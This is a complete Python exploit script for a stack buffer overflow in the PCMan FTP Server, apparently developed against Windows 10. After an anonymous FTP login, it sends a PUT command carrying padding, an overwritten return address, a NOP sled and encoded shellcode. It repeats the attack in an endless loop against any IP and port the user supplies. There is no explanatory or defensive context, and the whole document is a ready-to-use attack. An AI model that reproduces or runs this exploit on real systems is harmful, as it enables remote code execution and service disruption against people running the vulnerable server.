#!/usr/bin/python3
# developed and tested against windows 10
import argparse, socket


def execute(ip, port):  
    buffer = "A" * 2007 # 2007
    eip = "\xac\xd2\x81\x76" # 0x7681D2AC
    nop_sled = '\x90' * 40
    shellcode = ("\xb8\x92\xe8\xd7\x02\xda\xcd\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x83\xeb\xfc\x03\xd1\xe6\x35\xf7\x29\x1e\x3b"
"\xf8\xd1\xdf\x5c\x70\x34\xee\x5c\xe6\x3d\x41\x6d\x6c\x13\x6e"
"\x06\x20\x87\xe5\x6a\xed\xa8\x4e\xc0\xcb\x87\x4f\x79\x2f\x86"
"\xd3\x80\x7c\x68\xed\x4a\x71\x69\x2a\xb6\x78\x3b\xe3\xbc\x2f"
"\xab\x80\x89\xf3\x40\xda\x1c\x74\xb5\xab\x1f\x55\x68\xa7\x79"
"\x75\x8b\x64\xf2\x3c\x93\x69\x3f\xf6\x28\x59\xcb\x09\xf8\x93"
"\x34\xa5\xc5\x1b\xc7\xb7\x02\x9b\x38\xc2\x7a\xdf\xc5\xd5\xb9"
"\x9d\x11\x53\x59\x05\xd1\xc3\x85\xb7\x36\x95\x4e\xbb\xf3\xd1"
"\x08\xd8\x02\x35\x23\xe4\x8f\xb8\xe3\x6c\xcb\x9e\x27\x34\x8f"
"\xbf\x7e\x90\x7e\xbf\x60\x7b\xde\x65\xeb\x96\x0b\x14\xb6\xfe"
"\xf8\x15\x48\xff\x96\x2e\x3b\xcd\x39\x85\xd3\x7d\xb1\x03\x24"
"\x81\xe8\xf4\xba\x7c\x13\x05\x93\xba\x47\x55\x8b\x6b\xe8\x3e"
"\x4b\x93\x3d\x90\x1b\x3b\xee\x51\xcb\xfb\x5e\x3a\x01\xf4\x81"
"\x5a\x2a\xde\xa9\xf1\xd1\x89\x79\x15\xab\xcd\xea\x14\x4b\xee"
"\x67\x91\xad\x84\x67\xf4\x66\x31\x11\x5d\xfc\xa0\xde\x4b\x79"
"\xe2\x55\x78\x7e\xad\x9d\xf5\x6c\x5a\x6e\x40\xce\xcd\x71\x7e"
"\x66\x91\xe0\xe5\x76\xdc\x18\xb2\x21\x89\xef\xcb\xa7\x27\x49"
"\x62\xd5\xb5\x0f\x4d\x5d\x62\xec\x50\x5c\xe7\x48\x77\x4e\x31"
"\x50\x33\x3a\xed\x07\xed\x94\x4b\xfe\x5f\x4e\x02\xad\x09\x06"
"\xd3\x9d\x89\x50\xdc\xcb\x7f\xbc\x6d\xa2\x39\xc3\x42\x22\xce"
"\xbc\xbe\xd2\x31\x17\x7b\xe2\x7b\x35\x2a\x6b\x22\xac\x6e\xf6"
"\xd5\x1b\xac\x0f\x56\xa9\x4d\xf4\x46\xd8\x48\xb0\xc0\x31\x21"
"\xa9\xa4\x35\x96\xca\xec")

    payload = buffer + eip + nop_sled + shellcode
    
    print("Sending payload...")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((ip,port))
    s.recv(1024)
    s.send(b'USER anonymous\r\n')
    s.recv(1024)
    s.send(b'PASS anonymous\r\n')
    #s.recv(1024)
    s.send(b'PUT' + bytes(payload, "ISO-8859-1"))
    #s.recv(1024)
    s.close()


def main():
    '''Grabs user arguments and calls appropriate functions.'''
    parser = argparse.ArgumentParser(description='Provide the url for the vulnerable pcman ftp server.')
    parser.add_argument('-v', '--version', dest='ver', required=False, action='store_true', help='display version number.')
    parser.add_argument('-t', '--target', dest='target', required=False, type=str, help="provide a target url ex: 10.10.10.10")
    parser.add_argument('-p', '--port', dest='port', required=False, type=int, help="provide a target port ex: -p 21")
    args = parser.parse_args()
    target_ip = args.target
    target_port = args.port

    if args.ver:
        print("PCManFTPServerb0f version 0.1")
        exit()
    if (not target_ip) or (not target_port):
        print('Usage: python3 PCManFTPServerb0f.py -t <address> -p <port>')
        exit(0)
    else:
        print("[+] Running b0f against:", target_ip, target_port)
        while True:
            execute(target_ip, target_port)
        
if __name__ == '__main__':
    main()